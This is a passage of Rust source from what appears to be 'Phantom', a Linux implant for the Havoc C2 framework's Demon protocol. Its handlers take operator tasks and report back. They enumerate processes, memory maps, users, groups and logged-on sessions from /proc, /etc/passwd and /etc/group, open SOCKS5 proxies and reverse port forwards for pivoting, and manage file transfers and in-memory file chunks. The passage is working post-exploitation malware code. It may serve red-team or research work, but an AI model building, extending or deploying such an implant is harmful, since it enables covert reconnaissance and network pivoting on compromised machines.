        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = enumerate_processes()?
                .into_iter()
                .filter(|process| process.name.to_lowercase().contains(&needle))
                .collect::<Vec<_>>();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_grep(&filtered)?,
            });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let modules = enumerate_modules(pid)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_modules(pid, &modules)?,
            });
        }
        DemonProcessCommand::Memory => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let query_protection = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
            let regions = enumerate_memory_regions(pid, query_protection)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_memory(pid, query_protection, &regions),
            });
        }
    }

    Ok(())
}

fn execute_network(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandNet),
            request_id,
            payload: encode_net_domain(&linux_domain_name())?,
        }),
        DemonNetCommand::Logons => {
            let target = default_net_target(&parser.wstring()?);
            let users = logged_on_users();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_logons(&target, &users)?,
            });
        }
        DemonNetCommand::Sessions => {
            let target = default_net_target(&parser.wstring()?);
            let sessions = logged_on_sessions();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_sessions(&target, &sessions)?,
            });
        }
        DemonNetCommand::Computer => {
            let target = default_net_target(&parser.wstring()?);
            let computers = compatible_computer_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::Computer, &target, &computers)?,
            });
        }
        DemonNetCommand::DcList => {
            let target = default_net_target(&parser.wstring()?);
            let controllers = compatible_dc_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::DcList, &target, &controllers)?,
            });
        }
        DemonNetCommand::Share => {
            let target = default_net_target(&parser.wstring()?);
            let shares = compatible_share_list();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_shares(&target, &shares)?,
            });
        }
        DemonNetCommand::LocalGroup => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::LocalGroup, &target, &groups)?,
            });
        }
        DemonNetCommand::Group => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::Group, &target, &groups)?,
            });
        }
        DemonNetCommand::Users => {
            let target = default_net_target(&parser.wstring()?);
            let users = enumerate_users()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_users(&target, &users)?,
            });
        }
    }

    Ok(())
}

async fn execute_socket(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
    let subcommand = DemonSocketCommand::try_from(subcommand)?;

    match subcommand {
        DemonSocketCommand::ReversePortForwardAdd => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Teamserver,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAdd,
            )?;
        }
        DemonSocketCommand::ReversePortForwardAddLocal => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Local,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAddLocal,
            )?;
        }
        DemonSocketCommand::ReversePortForwardList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
            for (socket_id, listener) in &state.reverse_port_forwards {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(listener.bind_addr));
                payload.extend_from_slice(&encode_u32(listener.bind_port));
                payload.extend_from_slice(&encode_u32(listener.forward_addr));
                payload.extend_from_slice(&encode_u32(listener.forward_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::ReversePortForwardClear => {
            let listener_ids = state.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
            for listener_id in listener_ids {
                state.remove_reverse_port_forward(listener_id);
            }
            let client_ids = state
                .sockets
                .iter()
                .filter_map(|(socket_id, socket)| {
                    (socket.socket_type == DemonSocketType::Client).then_some(*socket_id)
                })
                .collect::<Vec<_>>();
            for client_id in client_ids {
                state.remove_socket(client_id);
            }
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socket_clear(true),
            });
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
            if state.reverse_port_forwards.contains_key(&socket_id) {
                let callbacks_before = state.pending_callbacks.len();
                state.remove_reverse_port_forward(socket_id);
                if let Some(PendingCallback::Socket { request_id: callback_request_id, .. }) =
                    state.pending_callbacks.get_mut(callbacks_before)
                {
                    *callback_request_id = request_id;
                }
            }
        }
        DemonSocketCommand::SocksProxyAdd => {
            let bind_addr = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind address"))?;
            let bind_port = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind port"))?;
            let listener_id = state.allocate_socket_id();
            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
            match TcpListener::bind(bind_socket) {
                Ok(listener) => {
                    listener
                        .set_nonblocking(true)
                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
                    let bound_port = listener
                        .local_addr()
                        .map(|addr| u32::from(addr.port()))
                        .unwrap_or(bind_port);
                    state.socks_proxies.insert(
                        listener_id,
                        SocksProxy { listener, bind_addr, bind_port: bound_port },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                    });
                }
                Err(_error) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    });
                }
            }
        }
        DemonSocketCommand::SocksProxyList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
            for (socket_id, proxy) in &state.socks_proxies {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(proxy.bind_addr));
                payload.extend_from_slice(&encode_u32(proxy.bind_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::SocksProxyRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy socket id"))?;
            if state.socks_proxies.remove(&socket_id).is_some() {
                let client_ids = state
                    .socks_clients
                    .iter()
                    .filter_map(|(client_id, client)| {
                        (client.server_id == socket_id).then_some(*client_id)
                    })
                    .collect::<Vec<_>>();
                for client_id in client_ids {
                    state.socks_clients.remove(&client_id);
                }
                state.queue_callback(PendingCallback::Socket {
                    request_id,
                    payload: encode_socks_proxy_remove(socket_id),
                });
            }
        }
        DemonSocketCommand::SocksProxyClear => {
            state.socks_proxies.clear();
            state.socks_clients.clear();
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socks_proxy_clear(true),
            });
        }
        DemonSocketCommand::Open => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("socket open is a callback-only path in Phantom"),
            });
        }
        DemonSocketCommand::Read => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let socket_type = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
            let socket_type = DemonSocketType::try_from(socket_type)?;
            let success = parser.bool32()?;

            if success {
                let data = parser.bytes()?;
                write_to_socket(request_id, state, socket_id, socket_type, data)?;
            } else {
                let error_code = u32::try_from(parser.int32()?)
                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("socket {socket_id:#x} read failed with error {error_code}"),
                });
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let data = parser.bytes()?;
            let mut write_failure = None;
            if let Some(socket) = state.sockets.get_mut(&socket_id) {
                if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
                    write_failure = Some(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_write_failure(
                            socket_id,
                            socket.socket_type,
                            raw_socket_error(&error),
                        ),
                    });
                }
            }
            if let Some(callback) = write_failure {
                state.queue_callback(callback);
                state.remove_socket(socket_id);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            state.remove_socket(socket_id);
        }
        DemonSocketCommand::Connect => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let atyp = parser.byte()?;
            let host = parser.bytes()?;
            let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());

            let connection = connect_socks_target(atyp, host, port).await;
            match connection {
                Ok(stream) => {
                    state.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::ReverseProxy,
                            bind_addr: 0,
                            bind_port: u32::from(port),
                            forward_addr: 0,
                            forward_port: 0,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(true, socket_id, 0),
                    });
                }
                Err(error_code) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(false, socket_id, error_code),
                    });
                }
            }
        }
    }

    Ok(())
}

fn execute_memfile(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let mem_file_id = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
    let total_size = usize::try_from(parser.int64()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
    let chunk = parser.bytes()?;

    let entry = state.mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    if entry.expected_size != total_size || entry.data.len() > total_size {
        state.queue_callback(PendingCallback::MemFileAck {
            request_id,
            mem_file_id,
            success: false,
        });
        return Ok(());
    }

    entry.append(chunk);
    state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });

    Ok(())
}

/// Handle `CommandTransfer` (2530): list, stop, resume, remove active downloads.
fn execute_transfer(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative transfer subcommand"))?;
    let subcommand = DemonTransferCommand::try_from(subcommand)?;

    match subcommand {
        DemonTransferCommand::List => {
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_list(&state.downloads),
            });
        }
        DemonTransferCommand::Stop => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Stopped;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Stop, found, file_id),
            });
        }
        DemonTransferCommand::Resume => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Running;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Resume, found, file_id),
            });
        }
        DemonTransferCommand::Remove => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Remove;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Remove, found, file_id),
            });
            // Send a close callback for the removed download, matching Demon behaviour.
            if found {
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandTransfer),
                    request_id,
                    payload: encode_transfer_remove_close(file_id),
                });
            }
        }
    }

    Ok(())
}

fn write_to_socket(
    request_id: u32,
    state: &mut PhantomState,
    socket_id: u32,
    expected_type: DemonSocketType,
    data: &[u8],
) -> Result<(), PhantomError> {
    let Some(socket) = state.sockets.get_mut(&socket_id) else {
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("socket {socket_id:#x} was not found"),
        });
        return Ok(());
    };

    let socket_type = socket.socket_type;
    if socket_type != expected_type {
        let actual_type = socket_type;
        let _ = socket;
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!(
                "socket {socket_id:#x} has type {:?}, expected {:?}",
                actual_type, expected_type
            ),
        });
        return Ok(());
    }

    if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
        let _ = socket;
        state.queue_callback(PendingCallback::Socket {
            request_id,
            payload: encode_socket_write_failure(socket_id, socket_type, raw_socket_error(&error)),
        });
        state.remove_socket(socket_id);
    }

    Ok(())
}

fn parse_reverse_port_forward_target(
    parser: &mut TaskParser<'_>,
) -> Result<(u32, u32, u32, u32), PhantomError> {
    let bind_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind address"))?;
    let bind_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
    let forward_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward address"))?;
    let forward_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward port"))?;
    Ok((bind_addr, bind_port, forward_addr, forward_port))
}

fn handle_reverse_port_forward_add(
    request_id: u32,
    state: &mut PhantomState,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
    command: DemonSocketCommand,
) -> Result<(), PhantomError> {
    let listener_id = state.allocate_socket_id();
    let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
    match TcpListener::bind(bind_socket) {
        Ok(listener) => {
            listener
                .set_nonblocking(true)
                .map_err(|error| PhantomError::Socket(error.to_string()))?;
            let bound_port =
                listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
            state.reverse_port_forwards.insert(
                listener_id,
                ReversePortForward {
                    listener,
                    mode,
                    bind_addr,
                    bind_port: bound_port,
                    forward_addr,
                    forward_port,
                },
            );
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    true,
                    listener_id,
                    bind_addr,
                    bound_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
        Err(_error) => {
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    false,
                    0,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
    }
    Ok(())
}

async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream =
        TokioTcpStream::connect(&target).await.map_err(|error| raw_socket_error(&error))?;
    let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
    stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
    Ok(stream)
}

async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
    let octets = Ipv4Addr::from(addr).octets();
    connect_socks_target(1, &octets, port).await
}

fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, PhantomError> {
    let mut chunk = [0_u8; 4096];
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => return Ok(true),
            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
            Err(error) if error.kind() == ErrorKind::WouldBlock => return Ok(false),
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(PhantomError::Socket(error.to_string())),
        }
    }
}

fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
    let mut buffer = [0_u8; 4096];
    loop {
        match source.read(&mut buffer) {
            Ok(0) => return true,
            Ok(read) => {
                if write_all_nonblocking(sink, &buffer[..read]).is_err() {
                    return true;
                }
            }
            Err(error) if error.kind() == ErrorKind::WouldBlock => return false,
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(_) => return true,
        }
    }
}

fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
    if buffer.len() < 2 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    let total = 2 + usize::from(buffer[1]);
    if buffer.len() < total {
        return None;
    }
    if !buffer[2..total].contains(&SOCKS_METHOD_NO_AUTH) {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    Some(Ok(total))
}

fn try_parse_socks_request(
    buffer: &[u8],
) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
    if buffer.len() < 4 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SocksRequestError::GeneralFailure));
    }
    if buffer[1] != SOCKS_COMMAND_CONNECT {
        return Some(Err(SocksRequestError::CommandNotSupported));
    }

    let atyp = buffer[3];
    let address_len = match atyp {
        1 => 4,
        3 => {
            if buffer.len() < 5 {
                return None;
            }
            usize::from(buffer[4]) + 1
        }
        4 => 16,
        _ => return Some(Err(SocksRequestError::AddressTypeNotSupported)),
    };

    let header_len = 4 + address_len;
    if buffer.len() < header_len + 2 {
        return None;
    }

    let address = match atyp {
        3 => buffer[5..header_len].to_vec(),
        _ => buffer[4..header_len].to_vec(),
    };
    let port = u16::from_be_bytes([buffer[header_len], buffer[header_len + 1]]);
    Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
}

fn send_socks_reply(
    stream: &mut TcpStream,
    reply: u8,
    atyp: u8,
    address: &[u8],
    port: u16,
) -> Result<(), PhantomError> {
    let mut response = vec![SOCKS_VERSION, reply, 0, atyp];
    match atyp {
        3 => {
            let length = u8::try_from(address.len())
                .map_err(|_| PhantomError::Socket(String::from("SOCKS domain too long")))?;
            response.push(length);
            response.extend_from_slice(address);
        }
        _ => response.extend_from_slice(address),
    }
    response.extend_from_slice(&port.to_be_bytes());
    write_all_nonblocking(stream, &response)
        .map_err(|error| PhantomError::Socket(error.to_string()))
}

fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(error),
        }
    }

    Ok(())
}

fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}

fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
    let mut processes = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        match read_process_entry(pid) {
            Ok(process) => processes.push(process),
            Err(PhantomError::Io { message, .. })
                if message.contains("No such file or directory") =>
            {
                continue;
            }
            Err(error) => return Err(error),
        }
    }
    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
    Ok(processes)
}

fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
    let proc_path = PathBuf::from(format!("/proc/{pid}"));
    let status = fs::read_to_string(proc_path.join("status"))
        .map_err(|error| io_error(proc_path.join("status"), error))?;
    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
    let parent_pid = status_field(&status, "PPid")
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();
    let threads =
        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
    let session = read_process_session(pid).unwrap_or_default();
    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;

    Ok(ProcessEntry {
        name: executable_name(&exe),
        pid,
        parent_pid,
        session,
        threads,
        user: username_for_uid(metadata.uid()),
        is_wow64,
    })
}

fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
    status.lines().find_map(|line| {
        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
    })
}

fn read_process_session(pid: u32) -> Option<u32> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let suffix = stat.split_once(") ")?.1;
    let fields = suffix.split_whitespace().collect::<Vec<_>>();
    fields.get(3)?.parse::<u32>().ok()
}

fn process_arch_bits(exe: &Path) -> Option<u32> {
    let header = fs::read(exe).ok()?;
    if header.len() < 5 || &header[..4] != b"\x7FELF" {
        return None;
    }
    match header[4] {
        1 => Some(32),
        2 => Some(64),
        _ => None,
    }
}

fn username_for_uid(uid: u32) -> String {
    fs::read_to_string("/etc/passwd")
        .ok()
        .and_then(|passwd| {
            passwd.lines().find_map(|line| {
                let mut fields = line.split(':');
                let username = fields.next()?;
                let _password = fields.next()?;
                let entry_uid = fields.next()?.parse::<u32>().ok()?;
                (entry_uid == uid).then(|| username.to_string())
            })
        })
        .unwrap_or_else(|| uid.to_string())
}

fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut modules = BTreeMap::new();
    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(range) = parts.next() else {
            continue;
        };
        let path = parts.nth(4).unwrap_or_default();
        if path.is_empty() || !path.starts_with('/') {
            continue;
        }
        let Some((base, _)) = range.split_once('-') else {
            continue;
        };
        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
            continue;
        };
        modules.entry(path.to_string()).or_insert(base_addr);
    }
    Ok(modules.into_iter().collect())
}

fn linux_domain_name() -> String {
    fs::read_to_string("/etc/resolv.conf")
        .ok()
        .and_then(|contents| {
            contents.lines().find_map(|line| {
                let trimmed = line.trim();
                trimmed
                    .strip_prefix("search ")
                    .or_else(|| trimmed.strip_prefix("domain "))
                    .map(|value| value.trim().to_string())
            })
        })
        .unwrap_or_default()
}

fn local_hostname() -> String {
    fs::read_to_string("/etc/hostname")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .or_else(|| std::env::var("HOSTNAME").ok().filter(|value| !value.is_empty()))
        .unwrap_or_else(|| String::from("localhost"))
}

fn default_net_target(value: &str) -> String {
    if value.is_empty() { local_hostname() } else { value.to_string() }
}

fn compatible_computer_list(target: &str) -> Vec<String> {
    let hostname = local_hostname();
    (target.eq_ignore_ascii_case(&hostname)
        || target == "."
        || target.eq_ignore_ascii_case("localhost"))
    .then_some(hostname)
    .into_iter()
    .collect()
}

fn compatible_dc_list(target: &str) -> Vec<String> {
    let domain = linux_domain_name();
    if domain.is_empty() || !target.eq_ignore_ascii_case(&domain) {
        return Vec::new();
    }
    vec![local_hostname()]
}

fn compatible_share_list() -> Vec<ShareEntry> {
    Vec::new()
}

fn logged_on_users() -> Vec<String> {
    parse_logged_on_users(&run_who())
}

fn logged_on_sessions() -> Vec<SessionEntry> {
    parse_logged_on_sessions(&run_who())
}

fn run_who() -> String {
    match std::process::Command::new("who").output() {
        Ok(output) if output.status.success() => {
            String::from_utf8_lossy(&output.stdout).into_owned()
        }
        _ => String::new(),
    }
}

fn parse_logged_on_users(output: &str) -> Vec<String> {
    let mut users = output
        .lines()
        .filter_map(|line| line.split_whitespace().next().map(str::to_string))
        .collect::<Vec<_>>();
    users.sort();
    users.dedup();
    users
}

fn parse_logged_on_sessions(output: &str) -> Vec<SessionEntry> {
    output
        .lines()
        .filter_map(|line| {
            let parts = line.split_whitespace().collect::<Vec<_>>();
            let user = parts.first()?.to_string();
            let fallback_client = parts.get(1).copied().unwrap_or_default().to_string();
            let client = line
                .rsplit_once('(')
                .and_then(|(_, suffix)| suffix.strip_suffix(')'))
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .unwrap_or(&fallback_client)
                .to_string();
            Some(SessionEntry { client, user, active: 0, idle: 0 })
        })
        .collect()
}

fn enumerate_groups() -> Result<Vec<GroupEntry>, PhantomError> {
    let contents =
        fs::read_to_string("/etc/group").map_err(|error| io_error("/etc/group", error))?;
    Ok(parse_group_entries(&contents))
}

fn parse_group_entries(contents: &str) -> Vec<GroupEntry> {
    let mut groups = contents
        .lines()
        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
        .filter_map(|line| {
            let mut fields = line.split(':');
            let name = fields.next()?.trim();
            let _password = fields.next()?;
            let gid = fields.next()?.trim();
            let members = fields.next().unwrap_or_default().trim();
            let description = if members.is_empty() {
                format!("gid={gid}")
            } else {
                format!("gid={gid}; members={members}")
            };
            Some(GroupEntry { name: name.to_string(), description })
        })
        .collect::<Vec<_>>();
    groups.sort_by(|left, right| left.name.cmp(&right.name));
    groups
}

fn enumerate_users() -> Result<Vec<UserEntry>, PhantomError> {
    let contents =
        fs::read_to_string("/etc/passwd").map_err(|error| io_error("/etc/passwd", error))?;
    Ok(parse_user_entries(&contents))
}

fn parse_user_entries(contents: &str) -> Vec<UserEntry> {
    let mut users = contents
        .lines()
        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
        .filter_map(|line| {
            let mut fields = line.split(':');
            let name = fields.next()?.trim();
            let _password = fields.next()?;
            let uid = fields.next()?.trim().parse::<u32>().ok()?;
            Some(UserEntry { name: name.to_string(), is_admin: uid == 0 })
        })
        .collect::<Vec<_>>();
    users.sort_by(|left, right| left.name.cmp(&right.name));
    users
}

fn enumerate_memory_regions(
    pid: u32,
    query_protection: u32,
) -> Result<Vec<MemoryRegion>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut regions = contents
        .lines()
        .filter_map(parse_memory_region)
        .filter(|region| query_protection == 0 || region.protect == query_protection)
        .collect::<Vec<_>>();
    regions.sort_by(|left, right| left.base.cmp(&right.base));
    Ok(regions)
}

fn parse_memory_region(line: &str) -> Option<MemoryRegion> {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let range = *fields.first()?;
    let perms = *fields.get(1)?;
    let path = fields.get(5).copied();
    let (start, end) = range.split_once('-')?;
    let base = u64::from_str_radix(start, 16).ok()?;
    let end = u64::from_str_radix(end, 16).ok()?;
